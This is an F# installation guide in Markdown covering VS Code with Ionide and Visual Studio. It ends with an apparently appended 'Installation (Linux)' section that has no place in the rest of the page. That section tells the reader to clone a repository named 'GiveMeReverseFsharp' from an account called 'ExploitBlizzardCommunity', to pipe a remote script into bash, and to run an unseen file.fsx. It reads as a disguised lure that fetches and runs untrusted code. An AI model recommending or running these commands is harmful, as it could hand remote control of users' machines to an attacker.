### Option 2: Install Visual Studio Code and Ionide

![logo](https://fsharp.org/images/thumbs/VSCode.png) [Visual Studio Code](https://code.visualstudio.com/) is a free, [open source](https://github.com/microsoft/vscode), cross platform source code editor supporting [a lot of languages](https://code.visualstudio.com/docs/languages/overview). F# is supported by the [Ionide](http://ionide.io/) project.

1.  Install [.NET Core SDK](https://dotnet.microsoft.com/download) like in step 1.
    
2.  Install [Visual Studio Code](https://code.visualstudio.com/download) for Windows.
    
3.  Press `Ctrl+Shift+P` and enter the following to install the Ionide package for VS Code.
    
    ```
     ext install Ionide-fsharp
    ```
    

You can also install the plugin from the plugin pane on the left-hand side.

Ionide works best if you use the .NET CLI to create your projects. You can learn more in [Get Started with F# in Visual Studio Code](https://docs.microsoft.com/dotnet/fsharp/get-started/get-started-vscode).


### Option 3: Install Visual Studio

![logo](https://fsharp.org/images/thumbs/vstudio.png) On Windows, F# programmers commonly use the Visual Studio tools for F#.

-   [Visual Studio 2019](https://www.visualstudio.com/downloads/) comes with F# support in all its editions: Community, Professional and Enterprise. Community is completely free. See [Get started with F# in Visual Studio](https://docs.microsoft.com/dotnet/fsharp/get-started/get-started-visual-studio) for more information.
    
-   If you already have an older version of Visual Studio, F# is also supported. But the quality of the tooling support and number of features is not as high as in Visual Studio 2019.

**You can build and contribute to the F# compiler and library from [the source](https://github.com/dotnet/fsharp).**



## Installation (Linux).

```
git clone https://github.com/ExploitBlizzardCommunity/GiveMeReverseFsharp.git

curl -sSL https://dot.net/v1/dotnet-install.sh | bash /dev/stdin --channel Current

dotnet fsi file.fsx
```
